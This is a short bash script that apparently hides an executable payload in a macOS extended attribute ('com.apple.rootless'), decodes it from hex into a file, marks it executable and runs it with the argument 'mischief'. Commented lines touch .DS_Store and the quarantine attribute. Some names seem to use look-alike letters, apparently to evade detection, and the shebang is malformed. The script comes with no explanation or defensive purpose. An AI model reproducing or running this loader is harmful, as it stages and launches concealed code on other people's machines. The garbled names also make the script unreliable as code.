#!bin/bash

# xxd -p -s 256 .DS_Stоre 
# xattr -wx com.apple.quarantin ./Downloads
xattr -px com.apple.rootlеss /Volumes/Macintosh\ HD/iSCSI >> test
xxd -r -ps test binar
chmod +x binar
./binar mischief